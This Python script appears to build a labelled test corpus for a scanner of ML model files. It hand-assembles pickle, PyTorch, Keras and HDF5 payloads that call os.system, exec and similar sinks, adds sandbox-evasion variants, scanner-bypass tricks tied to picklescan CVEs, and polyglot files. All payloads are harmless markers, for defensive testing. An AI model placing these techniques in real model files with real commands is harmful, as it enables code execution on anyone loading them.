"""Build the lab corpus: harmless marker payloads plus benign controls.

Every payload is a marker only: it would run ``echo MARKER``, write
``/tmp/safeloadai_marker``, or connect to 127.0.0.1. Pickles are assembled
opcode by opcode (nothing is pickled from a live malicious object), and Lambda
bytecode is compiled inside the WASI sandbox so it matches the guest's Python.
Nothing here loads, unpickles or unmarshals anything on the host.

    python -m tests.corpus.build_corpus OUT_DIR

writes the files plus ``manifest.json`` (file, label, category, expected).
``expected`` is the least severe verdict that counts as a correct answer.
"""
from __future__ import annotations

import io
import json
import os
import pickle
import struct
import sys
import zipfile
from collections import OrderedDict

MALICIOUS, SUSPICIOUS, CLEAN = "MALICIOUS", "SUSPICIOUS", "CLEAN"
MARKER_CMD = "echo MARKER"
MARKER_FILE = "/tmp/safeloadai_marker"
TORCH_LEGACY_MAGIC = 0x1950A86A20F9469CFC6C

# --- pickle assembler ----------------------------------------------------------

P2, P4, STOP = b"\x80\x02", b"\x80\x04", b"."


def s(text: str) -> bytes:
    raw = text.encode()
    return b"X" + struct.pack("<I", len(raw)) + raw


def g(module: str, name: str) -> bytes:
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n"


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


def call(fn: bytes, *args: bytes) -> bytes:
    return fn + b"(" + b"".join(args) + b"tR"


def tup(*items: bytes) -> bytes:
    return b"(" + b"".join(items) + b"t"


def exec_payload(code: str) -> bytes:
    return P2 + call(g("builtins", "exec"), s(code)) + STOP


def pickle_payloads() -> list[tuple[str, str, str, bytes]]:
    """(file name, category, expected verdict, bytes)."""
    evil = P2 + call(g("posix", "system"), s(MARKER_CMD)) + STOP
    return [
        ("p_os_system.pkl", "process", MALICIOUS, evil),
        ("p_os_system_stack_global.pkl", "process", MALICIOUS,
         P4 + call(sg("os", "system"), s(MARKER_CMD)) + STOP),
        ("p_nt_system.pkl", "process", MALICIOUS, P2 + call(g("nt", "system"), s(MARKER_CMD)) + STOP),
        ("p_subprocess_getoutput.pkl", "process", MALICIOUS,
         P2 + call(g("subprocess", "getoutput"), s(MARKER_CMD)) + STOP),
        ("p_inst_opcode.pkl", "process", MALICIOUS, b"(S'" + MARKER_CMD.encode() + b"'\nios\nsystem\n."),
        ("p_obj_opcode.pkl", "process", MALICIOUS, P2 + b"(" + g("posix", "system") + s(MARKER_CMD) + b"o."),
        ("p_getattr_chain.pkl", "process", MALICIOUS,
         P2 + call(call(g("builtins", "getattr"), call(g("builtins", "__import__"), s("os")), s("system")),
                   s(MARKER_CMD)) + STOP),
        ("p_exec_nested.pkl", "code_exec", MALICIOUS, exec_payload(f"import os; os.system('{MARKER_CMD}')")),
        ("p_eval.pkl", "code_exec", MALICIOUS,
         P2 + call(g("builtins", "eval"), s(f"__import__('os').system('{MARKER_CMD}')")) + STOP),
        ("p_runpy.pkl", "code_exec", MALICIOUS, P2 + call(g("runpy", "run_path"), s(MARKER_FILE)) + STOP),
        ("p_importlib.pkl", "code_exec", MALICIOUS,
         P2 + call(g("importlib", "import_module"), s("safeloadai_marker_module")) + STOP),
        ("p_open_write.pkl", "file_write", MALICIOUS,
         P2 + call(g("builtins", "open"), s(MARKER_FILE), s("w")) + STOP),
        ("p_shutil_rmtree.pkl", "file_write", MALICIOUS,
         P2 + call(g("shutil", "rmtree"), s(MARKER_FILE)) + STOP),
        ("p_socket_loopback.pkl", "network", MALICIOUS,
         P2 + call(g("socket", "create_connection"), tup(s("127.0.0.1"), b"K\x09")) + STOP),
        ("p_webbrowser.pkl", "network", MALICIOUS,
         P2 + call(g("webbrowser", "open"), s("http://127.0.0.1:9/MARKER")) + STOP),
        ("p_ctypes.pkl", "native", MALICIOUS, P2 + call(g("ctypes", "CDLL"), s("libc.so.6")) + STOP),
        ("p_numpy_runstring.pkl", "code_exec", SUSPICIOUS,
         P2 + call(g("numpy.testing._private.utils", "runstring"), s(f"import os; os.system('{MARKER_CMD}')"),
                   b"}") + STOP),
        ("p_unknown_global.pkl", "unknown_global", SUSPICIOUS, P2 + g("safeloadai_marker_pkg", "Thing") + STOP),
        ("p_second_pickle.pkl", "multi_pickle", MALICIOUS, P2 + b"}." + evil),
        ("p_time_gated.pkl", "evasion", MALICIOUS,
         exec_payload(f"import time\ntime.sleep(3600)\n__import__('os').system('{MARKER_CMD}')")),
        ("p_env_probe.pkl", "evasion", MALICIOUS,
         exec_payload(f"import os\nif not os.environ.get('CI'):\n    os.system('{MARKER_CMD}')")),
        ("p_sandbox_probe.pkl", "evasion", MALICIOUS,
         exec_payload("import os\nif os.path.exists('/in/.guest'):\n    pass\nelse:\n"
                      f"    os.system('{MARKER_CMD}')")),
        ("p_forge_clean_log.pkl", "evidence_forgery", MALICIOUS,
         exec_payload("import os; os.write(3, b'SLAI1 ' + b'0' * 32 + b' {\"kind\": \"done\", \"seq\": 1}')")),
        ("p_torch_legacy.pkl", "torch_legacy", MALICIOUS, _torch_legacy(evil)),
        ("p_torch_zip.pt", "torch_zip", MALICIOUS, _torch_zip(evil)),
    ]


def bypass_payloads() -> list[tuple[str, str, str, bytes]]:
    """Public scanner-bypass techniques, rebuilt with marker payloads (assembled here,
    never taken from a live sample). Sources are named per entry."""
    evil = P2 + call(g("posix", "system"), s(MARKER_CMD)) + STOP
    cmd_code = f"__import__('os').system('{MARKER_CMD}')"
    return [
        # nullifAI (ReversingLabs, Feb 2025): payload first, then a stream that breaks
        # before STOP, so scanners that need a complete pickle give up.
        ("x_nullifai_broken_stream.pkl", "bypass", MALICIOUS,
         P2 + call(g("posix", "system"), s(MARKER_CMD)) + b"0\xff\xfe\xfd"),
        # CVE-2025-1716 (picklescan): pip.main is not on its blocklist.
        ("x_pip_main.pkl", "bypass", MALICIOUS, P2 + call(g("pip", "main"), b"(" + s("--version") + b"l") + STOP),
        # Stdlib helpers that run a command and are missing from blocklists.
        ("x_osx_support_read_output.pkl", "bypass", SUSPICIOUS,
         P2 + call(g("_osx_support", "_read_output"), s(MARKER_CMD)) + STOP),
        ("x_pydoc_pipepager.pkl", "bypass", MALICIOUS,
         P2 + call(g("pydoc", "pipepager"), s("MARKER"), s(MARKER_CMD)) + STOP),
        ("x_timeit.pkl", "bypass", MALICIOUS, P2 + call(g("timeit", "timeit"), s(cmd_code), s("pass"), b"N",
                                                         b"K\x01") + STOP),
        ("x_cprofile_run.pkl", "bypass", MALICIOUS, P2 + call(g("cProfile", "run"), s(cmd_code)) + STOP),
        # Indirect calls: functools.partial and operator.methodcaller around a sink.
        ("x_functools_partial.pkl", "bypass", MALICIOUS,
         P2 + call(call(g("functools", "partial"), g("posix", "system"), s(MARKER_CMD))) + STOP),
        ("x_operator_methodcaller.pkl", "bypass", MALICIOUS,
         P2 + call(call(g("operator", "methodcaller"), s("system"), s(MARKER_CMD)),
                   call(g("builtins", "__import__"), s("os"))) + STOP),
        # CVE-2025-1944 (picklescan): local header and central directory disagree on the name.
        ("x_zip_name_mismatch.pt", "bypass", SUSPICIOUS, _zip_name_mismatch(_torch_zip(evil))),
        # CVE-2025-1945 (picklescan): general-purpose flag bits set on the pickle member.
        ("x_zip_flag_bits.pt", "bypass", SUSPICIOUS, _zip_flag_bits(_torch_zip(evil))),
        # CVE-2025-1889 (picklescan): a pickle hidden in a member without a .pkl name.
        ("x_zip_hidden_pickle.pt", "bypass", SUSPICIOUS, _torch_zip(P2 + b"}" + STOP, extra={"archive/data/0": evil})),
    ]


def _zip_name_mismatch(data: bytes) -> bytes:
    raw = bytearray(data)
    at = raw.index(b"PK\x03\x04")
    name_len = struct.unpack_from("<H", raw, at + 26)[0]
    name = raw[at + 30:at + 30 + name_len]
    raw[at + 30:at + 30 + name_len] = name[:-3] + b"txt"  # local header only
    return bytes(raw)


def _zip_flag_bits(data: bytes) -> bytes:
    raw = bytearray(data)
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        at = raw.index(sig)
        flags = struct.unpack_from("<H", raw, at + offset)[0]
        struct.pack_into("<H", raw, at + offset, flags | 0x0001)  # "encrypted"
    return bytes(raw)


def h5_entries() -> list[tuple[str, str, str, bytes]]:
    """Legacy Keras HDF5 rebuilds, from the committed fixtures (written by tf.keras 2.15)."""
    fixtures = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "fixtures", "h5")
    picks = [
        # CVE-2024-3660: Lambda bytecode that runs a marker command.
        ("k2_lambda_marker.h5", "h5_lambda", MALICIOUS),
        ("k2_lambda_os_system.h5", "h5_lambda", MALICIOUS),
        ("k2_custom_objects.h5", "custom_object", SUSPICIOUS),
        ("s_external_link.h5", "h5_structure", SUSPICIOUS),
        ("k2_sequential.h5", "benign", CLEAN),
        ("k2_functional_cnn.h5", "benign", CLEAN),
    ]
    out = []
    for name, category, expected in picks:
        with open(os.path.join(fixtures, name), "rb") as fh:
            out.append((name, category, expected, fh.read()))
    return out


def _torch_legacy(evil: bytes) -> bytes:
    magic = P2 + b"\x8a\x0a" + TORCH_LEGACY_MAGIC.to_bytes(10, "little") + STOP
    return magic + P2 + b"M\xe9\x03." + P2 + b"}." + evil + P2 + b"]." + b"\x00" * 16


def _torch_zip(data_pkl: bytes, extra: dict[str, bytes] | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("archive/data.pkl", data_pkl)
        for name, data in (extra or {}).items():
            zf.writestr(name, data)
        zf.writestr("archive/version", b"3\n")
    return buf.getvalue()


def _h5_with_userblock(prefix: bytes, size: int = 512) -> bytes:
    """A committed benign Keras HDF5 file moved behind a user block holding ``prefix``.

    The superblock's base address is set to the user block size, as the HDF5 library
    writes it, so every other address in the file stays valid."""
    fixtures = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "fixtures", "h5")
    with open(os.path.join(fixtures, "k2_sequential.h5"), "rb") as fh:
        h5 = bytearray(fh.read())
    if h5[8] != 0 or h5[13] != 8:
        raise ValueError("fixture is not a version 0 superblock with 8-byte offsets")
    struct.pack_into("<Q", h5, 24, size)
    if len(prefix) > size:
        raise ValueError("user block prefix too long")
    return prefix + b"\x00" * (size - len(prefix)) + bytes(h5)


def polyglot_payloads() -> list[tuple[str, str, str, bytes]]:
    """Files that are valid for more than one loader (format confusion). Each one hides
    the marker payload in the reading that the file's own format does not use."""
    import zlib

    evil = P2 + call(g("posix", "system"), s(MARKER_CMD)) + STOP
    benign = pickle.dumps({"weights": [0.5, -1.25]}, protocol=2)
    benign_torch = _torch_zip(P2 + b"}" + STOP)
    benign_keras = _keras_zip(_model())
    return [
        # pickle.load / torch.load (legacy branch) read the pickle; zipfile reads the archive.
        ("poly_pickle_then_torch_zip.pt", "polyglot", MALICIOUS, evil + benign_torch),
        ("poly_pickle_then_keras.keras", "polyglot", MALICIOUS, evil + benign_keras),
        ("poly_benign_pickle_then_evil_torch_zip.pkl", "polyglot", MALICIOUS, benign + _torch_zip(evil)),
        ("poly_pickle_trailing_evil_pickle.pkl", "polyglot", MALICIOUS, benign + evil),
        # h5py finds the superblock after the user block; pickle.load reads the user block.
        ("poly_h5_userblock_pickle.h5", "polyglot", MALICIOUS, _h5_with_userblock(evil)),
        # joblib.load decompresses from offset 0; zipfile reads the archive at the end.
        ("poly_joblib_zlib_then_zip.joblib", "polyglot", MALICIOUS, zlib.compress(evil) + benign_keras),
        # Plain controls of the same formats.
        ("b_torch_zip.pt", "benign", CLEAN, benign_torch),
        ("b_joblib_zlib.joblib", "benign", CLEAN, zlib.compress(benign)),
    ]


def pickle_benign() -> list[tuple[str, str, str, bytes]]:
    """Benign controls pickled from plain data built here (dumps only, never loads)."""
    data = {"weights": [0.5, -1.25, 3.0], "name": "model", "shape": (3,), "flags": {True, False},
            "meta": OrderedDict(a=1, b=b"\x00\x01"), "n": None}
    out = [(f"b_builtins_p{p}.pkl", "benign", CLEAN, pickle.dumps(data, protocol=p)) for p in range(0, 6)]
    out.append(("b_two_pickles.pkl", "benign", CLEAN, pickle.dumps([1, 2]) + pickle.dumps({"x": 1})))
    return out


# --- Keras -------------------------------------------------------------------------

LAMBDAS = {
    "k_lambda_os_system.keras": ("process", MALICIOUS,
                                 f"lambda x: (__import__('os').system('{MARKER_CMD}'), x)[1]"),
    "k_lambda_write_file.keras": ("file_write", MALICIOUS,
                                  f"lambda x: (tf.io.write_file('{MARKER_FILE}', 'MARKER'), x)[1]"),
    "k_lambda_py_function.keras": ("code_exec", MALICIOUS, "lambda x: tf.py_function(lambda y: y, [x], tf.float32)"),
    "k_lambda_getattr_strings.keras": ("process", MALICIOUS,
                                       f"lambda x: getattr(__import__('o' + 's'), 'sys' + 'tem')('{MARKER_CMD}')"),
    "k_lambda_env_probe.keras": ("evasion", SUSPICIOUS,
                                 "lambda x: x if __import__('os').environ.get('CI') else x * 2"),
    "k_lambda_weight_gated.keras": ("evasion", SUSPICIOUS,
                                    "lambda x: x if __import__('hashlib').sha256(str(x.numpy()).encode())"
                                    f".hexdigest() != 'ab' else __import__('os').system('{MARKER_CMD}')"),
    "k_lambda_introspection.keras": ("evasion", SUSPICIOUS,
                                     "lambda x: ().__class__.__bases__[0].__subclasses__() and x"),
    "k_lambda_unknown_global.keras": ("missing_stub", SUSPICIOUS, "lambda x: helper_not_defined(x)"),
    "b_lambda_scale.keras": ("benign", CLEAN, "lambda x: x * 2.0 + 1.0"),
    "b_lambda_relu.keras": ("benign", CLEAN, "lambda x: tf.nn.relu(x)"),
}


def compile_lambdas(sources: dict[str, str]) -> dict[str, str]:
    """Marshal each lambda's code inside the WASI guest; returns base64 per key."""
    from safeloadai.sandbox import run_guest

    lines = ["import base64, json, marshal", "out = {}"]
    for key, src in sources.items():
        lines.append(f"out[{key!r}] = base64.b64encode(marshal.dumps(({src}).__code__)).decode()")
    lines.append("print(json.dumps(out))")
    run = run_guest({"kind": "python", "code": "\n".join(lines)}, {})
    if not run.completed:
        raise RuntimeError("compiling Lambda bytecode in the sandbox failed: " + "; ".join(run.problems))
    return json.loads(run.guest_stdout.strip().splitlines()[-1])


def _layer(module: str, class_name: str, config: dict | None = None, **extra) -> dict:
    return {"module": module, "class_name": class_name, "registered_name": extra.pop("registered_name", None),
            "config": config or {}, **extra}


def _model(*layers: dict) -> dict:
    dense = _layer("keras.layers", "Dense", {"name": "dense", "units": 4, "activation": "relu"},
                   build_config={"input_shape": [None, 4]})
    return {"module": "keras", "class_name": "Sequential", "registered_name": None,
            "config": {"name": "sequential", "layers": [dense, *layers]}}


def _keras_zip(model: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("config.json", json.dumps(model))
        zf.writestr("metadata.json", json.dumps({"keras_version": "3.15.1", "date_saved": "2026-10-17@00:00:00"}))
    return buf.getvalue()


def _lambda_layer(code_b64: str, closure=None) -> dict:
    function = {"class_name": "__lambda__", "config": {"code": code_b64, "defaults": None, "closure": closure}}
    return _layer("keras.layers", "Lambda", {"name": "lambda", "function": function, "arguments": {}},
                  build_config={"input_shape": [None, 4]})


def keras_entries(with_lambdas: bool) -> list[tuple[str, str, str, bytes]]:
    out = [
        ("b_keras_dense.keras", "benign", CLEAN, _keras_zip(_model())),
        ("k_custom_object.keras", "custom_object", SUSPICIOUS,
         _keras_zip(_model(_layer("safeloadai_marker_pkg.layers", "Backdoor",
                                  registered_name="Custom>Backdoor")))),
        ("k_function_os_system.keras", "process", MALICIOUS,
         _keras_zip(_model(_layer("keras.layers", "Activation", {
             "name": "act", "activation": {"module": "posix", "class_name": "function", "config": "system",
                                           "registered_name": "function"}})))),
        ("k_tfoplambda_write_file.keras", "file_write", MALICIOUS,
         _keras_zip(_model(_layer("keras.layers", "TFOpLambda", {"name": "op", "function": "io.write_file"})))),
        ("k_prefix_module.keras", "module_prefix", SUSPICIOUS,
         _keras_zip(_model(_layer("kerasx.layers", "Dense", {"name": "d2", "units": 1})))),
    ]
    if not with_lambdas:
        return out
    sources = {name: src for name, (_c, _e, src) in LAMBDAS.items()}
    sources["k_lambda_closure_cmd.keras"] = "(lambda cmd: lambda x: (__import__('os').system(cmd), x)[1])('')"
    compiled = compile_lambdas(sources)
    for name, (category, expected, _src) in LAMBDAS.items():
        out.append((name, category, expected, _keras_zip(_model(_lambda_layer(compiled[name])))))
    out.append(("k_lambda_closure_cmd.keras", "process", MALICIOUS,
                _keras_zip(_model(_lambda_layer(compiled["k_lambda_closure_cmd.keras"], closure=[MARKER_CMD])))))
    return out


def build(out_dir: str, *, with_lambdas: bool = True) -> list[dict]:
    os.makedirs(out_dir, exist_ok=True)
    manifest = []
    entries = (pickle_payloads() + bypass_payloads() + pickle_benign() + keras_entries(with_lambdas) + h5_entries()
               + polyglot_payloads())
    for name, category, expected, data in entries:
        with open(os.path.join(out_dir, name), "wb") as fh:
            fh.write(data)
        manifest.append({"file": name, "label": "benign" if expected == CLEAN else "malicious",
                         "category": category, "expected": expected})
    with open(os.path.join(out_dir, "manifest.json"), "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, indent=2)
    return manifest


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if len(argv) != 1:
        print("usage: python -m tests.corpus.build_corpus OUT_DIR", file=sys.stderr)
        return 2
    manifest = build(argv[0])
    print(f"wrote {len(manifest)} files to {argv[0]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
